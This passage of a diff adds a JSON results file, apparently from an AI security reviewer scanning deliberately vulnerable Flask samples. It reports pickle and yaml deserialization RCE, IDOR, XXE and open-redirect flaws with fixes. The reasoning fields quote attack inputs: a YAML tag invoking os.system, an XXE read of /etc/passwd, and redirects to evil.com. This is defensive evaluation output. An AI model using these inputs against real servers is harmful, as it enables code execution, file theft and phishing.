+        "file_path": "examples/vulnerable_samples/python/07_insecure_deserialization.py",
+        "line_start": 27,
+        "line_end": 27,
+        "description": "The `/restore-session` endpoint decodes a base64-encoded value from the HTTP POST form field `session_blob` and passes it directly to `pickle.loads()`. An attacker can craft a malicious pickle payload that executes arbitrary Python code on the server when deserialized. This is a classic unauthenticated Remote Code Execution (RCE) vector \u2014 no authentication or validation is required.",
+        "vulnerable_code": "session_data = pickle.loads(base64.b64decode(encoded))",
+        "suggested_fix": "Never deserialize pickle data from untrusted sources. Use a safe, structured format such as JSON instead:\n\n```python\nimport json\n\n@app.route(\"/restore-session\", methods=[\"POST\"])\ndef restore_session():\n    raw = request.form.get(\"session_blob\", \"{}\")\n    session_data = json.loads(raw)  # JSON cannot execute code\n    return {\"restored\": list(session_data.keys())}\n```\n\nIf pickle is absolutely required for internal use, sign the payload with an HMAC using a secret key and verify the signature before deserializing:\n\n```python\nimport hmac, hashlib, pickle\n\nSECRET = b\"<strong-random-secret>\"\n\ndef safe_loads(signed_blob):\n    sig, data = signed_blob[:32], signed_blob[32:]\n    expected = hmac.new(SECRET, data, hashlib.sha256).digest()\n    if not hmac.compare_digest(sig, expected):\n        raise ValueError(\"Invalid signature\")\n    return pickle.loads(data)\n```",
+        "confidence": "high",
+        "reasoning": "pickle.loads() on attacker-controlled bytes allows arbitrary Python code execution. The attacker supplies the `session_blob` form field, which is only base64-decoded (not sanitized) before being passed to pickle.loads(). A crafted pickle payload with a `__reduce__` method can execute any OS command or Python code on the server without any authentication."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-502",
+        "owasp_category": "A08:2021 - Software and Data Integrity Failures",
+        "title": "Insecure Deserialization via yaml.load Without SafeLoader on Attacker-Controlled Input",
+        "file_path": "examples/vulnerable_samples/python/07_insecure_deserialization.py",
+        "line_start": 37,
+        "line_end": 37,
+        "description": "The `/config` endpoint passes the raw HTTP request body directly to `yaml.load()` without specifying a safe Loader. PyYAML's default (full) loader supports the `!!python/object` and `!!python/object/apply` tags, which allow arbitrary Python object construction and can lead to code execution. An attacker can POST a crafted YAML payload to achieve RCE.",
+        "vulnerable_code": "config = yaml.load(raw)",
+        "suggested_fix": "Replace `yaml.load()` with `yaml.safe_load()`, which only supports basic YAML types and does not allow arbitrary object construction:\n\n```python\n@app.route(\"/config\", methods=[\"POST\"])\ndef load_config():\n    raw = request.data\n    config = yaml.safe_load(raw)  # Safe: no arbitrary object construction\n    return {\"keys\": list(config.keys())}\n```\n\nAlternatively, if a specific loader is needed, pass `Loader=yaml.SafeLoader` explicitly:\n```python\nconfig = yaml.load(raw, Loader=yaml.SafeLoader)\n```",
+        "confidence": "high",
+        "reasoning": "yaml.load() without an explicit Loader uses the full YAML loader in older PyYAML versions, or raises a warning in newer ones but still defaults to unsafe behavior. An attacker can supply a YAML payload using tags like `!!python/object/apply:os.system ['id']` to execute arbitrary commands on the server."
+      }
+    ],
+    "summary": "This PR introduces a deliberately vulnerable sample file demonstrating insecure deserialization. Two real, exploitable vulnerabilities were identified in the changed lines: (1) a **critical** RCE via `pickle.loads()` on unauthenticated HTTP POST data at line 27, and (2) a **high** severity RCE via `yaml.load()` without a safe loader at line 37. The safe counterpart at line 44 (`yaml.safe_load`) is correctly implemented and should not be flagged. The file is clearly labeled as a vulnerable sample for educational purposes, but the vulnerabilities are real and exploitable as written.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5416,
+    "output_tokens": 1315,
+    "elapsed_seconds": 20.942172000010032
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/08_idor.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-639",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "IDOR: Missing Ownership Check on GET /invoices/<invoice_id>",
+        "file_path": "examples/vulnerable_samples/python/08_idor.py",
+        "line_start": 7,
+        "line_end": 13,
+        "description": "The `get_invoice` endpoint retrieves an invoice by its primary key (`invoice_id`) without verifying that the authenticated user owns the invoice. Any authenticated user can enumerate integer invoice IDs and read invoices belonging to other users.",
+        "vulnerable_code": "@app.route(\"/invoices/<int:invoice_id>\")\n@login_required\ndef get_invoice(invoice_id):\n    invoice = Invoice.query.get(invoice_id)\n    if not invoice:\n        return \"Not found\", 404\n    return jsonify(invoice.to_dict())",
+        "suggested_fix": "Add an ownership check before returning the invoice:\n\n```python\n@app.route(\"/invoices/<int:invoice_id>\")\n@login_required\ndef get_invoice(invoice_id):\n    invoice = Invoice.query.filter_by(\n        id=invoice_id,\n        user_id=current_user.id,\n    ).first()\n    if not invoice:\n        return \"Not found\", 404\n    return jsonify(invoice.to_dict())\n```",
+        "confidence": "high",
+        "reasoning": "The endpoint fetches an invoice solely by its integer primary key without scoping the query to `current_user.id`. An authenticated attacker can iterate over arbitrary `invoice_id` values to read any invoice in the system, which is a classic Insecure Direct Object Reference (IDOR)."
+      },
+      {
+        "severity": "high",
+        "cwe_id": "CWE-639",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "IDOR: Missing Ownership Check on DELETE /invoices/<invoice_id>",
+        "file_path": "examples/vulnerable_samples/python/08_idor.py",
+        "line_start": 16,
+        "line_end": 24,
+        "description": "The `delete_invoice` endpoint deletes an invoice by its primary key without verifying that the authenticated user owns the invoice. Any authenticated user can delete invoices belonging to other users by supplying an arbitrary `invoice_id`.",
+        "vulnerable_code": "@app.route(\"/invoices/<int:invoice_id>\", methods=[\"DELETE\"])\n@login_required\ndef delete_invoice(invoice_id):\n    invoice = Invoice.query.get(invoice_id)\n    if not invoice:\n        return \"Not found\", 404\n    db.session.delete(invoice)\n    db.session.commit()\n    return \"\", 204",
+        "suggested_fix": "Scope the query to the current user before deleting:\n\n```python\n@app.route(\"/invoices/<int:invoice_id>\", methods=[\"DELETE\"])\n@login_required\ndef delete_invoice(invoice_id):\n    invoice = Invoice.query.filter_by(\n        id=invoice_id,\n        user_id=current_user.id,\n    ).first()\n    if not invoice:\n        return \"Not found\", 404\n    db.session.delete(invoice)\n    db.session.commit()\n    return \"\", 204\n```",
+        "confidence": "high",
+        "reasoning": "The endpoint fetches the invoice by primary key alone and immediately deletes it without confirming the requesting user is the owner. An authenticated attacker can destroy any invoice in the system by guessing or enumerating integer IDs."
+      }
+    ],
+    "summary": "The PR introduces two high-severity Insecure Direct Object Reference (IDOR) vulnerabilities in the Flask invoice endpoints. Both `GET /invoices/<invoice_id>` and `DELETE /invoices/<invoice_id>` fetch records by primary key without scoping the query to the authenticated user's identity, allowing any logged-in user to read or delete another user's invoices. The `GET /my-invoices/<invoice_id>` endpoint (lines 27\u201336) correctly demonstrates the fix by filtering on both `id` and `user_id=current_user.id`. The two vulnerable endpoints should adopt the same pattern.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5405,
+    "output_tokens": 1152,
+    "elapsed_seconds": 15.427172700001393
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/09_xxe.py"
+    ],
+    "findings": [
+      {
+        "severity": "high",
+        "cwe_id": "CWE-611",
+        "owasp_category": "A05:2021 - Security Misconfiguration",
+        "title": "XXE Injection via lxml etree.fromstring with default parser",
+        "file_path": "examples/vulnerable_samples/python/09_xxe.py",
+        "line_start": 33,
+        "line_end": 34,
+        "description": "The `parse_xml` endpoint passes raw, attacker-controlled POST body data directly to `lxml.etree.fromstring()` using the default parser, which resolves external XML entities. An attacker can craft a payload referencing `file:///etc/passwd` or an internal network URL to read local files or trigger SSRF.",
+        "vulnerable_code": "tree = etree.fromstring(xml_input)\n    return etree.tostring(tree).decode()",
+        "suggested_fix": "Use lxml's XMLParser with `resolve_entities=False` and `no_network=True`, or switch to defusedxml:\n\n```python\nfrom defusedxml.lxml import fromstring as safe_fromstring_lxml\n\n# Option 1: defusedxml wrapper for lxml\ntree = safe_fromstring_lxml(xml_input)\n\n# Option 2: lxml with a hardened parser\nparser = etree.XMLParser(resolve_entities=False, no_network=True)\ntree = etree.fromstring(xml_input, parser=parser)\n```",
+        "confidence": "high",
+        "reasoning": "lxml's default parser resolves external entities without restriction. Attacker-controlled XML body data flows directly into `etree.fromstring()` with no parser hardening, enabling file disclosure (e.g., `file:///etc/passwd`) or SSRF via external entity references."
+      },
+      {
+        "severity": "medium",
+        "cwe_id": "CWE-611",
+        "owasp_category": "A05:2021 - Security Misconfiguration",
+        "title": "XXE Injection via xml.dom.minidom.parseString without entity restriction",
+        "file_path": "examples/vulnerable_samples/python/09_xxe.py",
+        "line_start": 43,
+        "line_end": 44,
+        "description": "The `parse_dom` endpoint passes attacker-controlled POST body data to `xml.dom.minidom.parseString()`, which does not disable external entity expansion by default. This can allow an attacker to read local files or cause denial of service via entity expansion attacks (billion laughs).",
+        "vulnerable_code": "dom = minidom.parseString(xml_input)\n    return dom.toxml()",
+        "suggested_fix": "Replace `xml.dom.minidom` with `defusedxml.minidom`, which disables dangerous XML features by default:\n\n```python\nfrom defusedxml.minidom import parseString as safe_parseString\n\ndom = safe_parseString(xml_input)\nreturn dom.toxml()\n```",
+        "confidence": "high",
+        "reasoning": "xml.dom.minidom does not disable external entity resolution or entity expansion by default. Attacker-controlled XML flows directly into `parseString()`, enabling XXE-based file reads or DoS. The severity is medium (rather than high) because minidom's external entity support is more limited than lxml's, but the risk is still real."
+      }
+    ],
+    "summary": "This PR introduces a deliberately vulnerable XXE sample file with two exploitable findings and one safe reference implementation. Two CWE-611 (XML External Entity) vulnerabilities were identified: (1) a high-severity XXE via lxml's `etree.fromstring()` with the default parser on an unauthenticated POST endpoint, enabling file disclosure and SSRF; and (2) a medium-severity XXE via `xml.dom.minidom.parseString()` without entity restriction. The safe endpoint using `defusedxml` is correctly implemented and should not be flagged. Both vulnerable endpoints accept raw, unauthenticated HTTP POST bodies, making them directly exploitable.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5471,
+    "output_tokens": 1053,
+    "elapsed_seconds": 16.361963099974673
+  },
+  {
+    "files_analyzed": [
+      "examples/vulnerable_samples/python/10_open_redirect.py"
+    ],
+    "findings": [
+      {
+        "severity": "medium",
+        "cwe_id": "CWE-601",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "Open Redirect in /login endpoint via unvalidated `next` parameter",
+        "file_path": "examples/vulnerable_samples/python/10_open_redirect.py",
+        "line_start": 30,
+        "line_end": 32,
+        "description": "The `next` query parameter is taken directly from the HTTP request and passed to Flask's `redirect()` without any validation. An attacker can craft a URL such as `https://yoursite.com/login?next=https://evil.com` that appears to originate from the trusted site but redirects the victim to an attacker-controlled domain, enabling phishing attacks.",
+        "vulnerable_code": "next_url = request.args.get(\"next\", \"/\")\n    # ... authentication happens here ...\n    return redirect(next_url)",
+        "suggested_fix": "Validate that the redirect target stays on the same host before redirecting. Example:\n\n```python\nfrom urllib.parse import urlparse, urljoin\n\ndef is_safe_url(target, host):\n    ref_url = urlparse(urljoin(request.host_url, target))\n    return ref_url.netloc == host\n\n@app.route(\"/login\")\ndef login():\n    next_url = request.args.get(\"next\", \"/\")\n    # ... authentication happens here ...\n    if not is_safe_url(next_url, request.host):\n        next_url = \"/\"\n    return redirect(next_url)\n```",
+        "confidence": "high",
+        "reasoning": "`request.args.get('next', '/')` is attacker-controlled and is passed directly to `redirect()` without any host or scheme validation, allowing redirection to arbitrary external URLs."
+      },
+      {
+        "severity": "medium",
+        "cwe_id": "CWE-601",
+        "owasp_category": "A01:2021 - Broken Access Control",
+        "title": "Open Redirect in /logout endpoint via unvalidated `return_to` parameter",
+        "file_path": "examples/vulnerable_samples/python/10_open_redirect.py",
+        "line_start": 38,
+        "line_end": 40,
+        "description": "The `return_to` query parameter is taken directly from the HTTP request and passed to Flask's `redirect()` without any validation. An attacker can craft a URL such as `https://yoursite.com/logout?return_to=https://evil.com` to redirect victims to a malicious site after logout, which is a common phishing vector (e.g., fake re-login pages).",
+        "vulnerable_code": "return_to = request.args.get(\"return_to\", \"/\")\n    # ... session cleanup ...\n    return redirect(return_to)",
+        "suggested_fix": "Validate that the redirect target stays on the same host before redirecting. Example:\n\n```python\nfrom urllib.parse import urlparse, urljoin\n\ndef is_safe_url(target, host):\n    ref_url = urlparse(urljoin(request.host_url, target))\n    return ref_url.netloc == host\n\n@app.route(\"/logout\")\ndef logout():\n    return_to = request.args.get(\"return_to\", \"/\")\n    # ... session cleanup ...\n    if not is_safe_url(return_to, request.host):\n        return_to = \"/\"\n    return redirect(return_to)\n```",
+        "confidence": "high",
+        "reasoning": "`request.args.get('return_to', '/')` is attacker-controlled and is passed directly to `redirect()` without any host or scheme validation, allowing redirection to arbitrary external URLs."
+      }
+    ],
+    "summary": "This PR introduces a new vulnerable sample file demonstrating open redirect vulnerabilities. Two confirmed CWE-601 findings were identified (medium severity, high confidence) in the `/login` and `/logout` endpoints, where user-supplied query parameters (`next` and `return_to`) are passed directly to Flask's `redirect()` without any validation. The `/safe-login` endpoint correctly demonstrates the mitigation pattern using `urlparse`/`urljoin` host validation and should NOT be flagged. No other vulnerability classes are present in this file.",
+    "model": "claude-sonnet-4-6",
+    "language": "python",
+    "input_tokens": 5429,
+    "output_tokens": 1145,
+    "elapsed_seconds": 14.718492699961644
+  }
+]
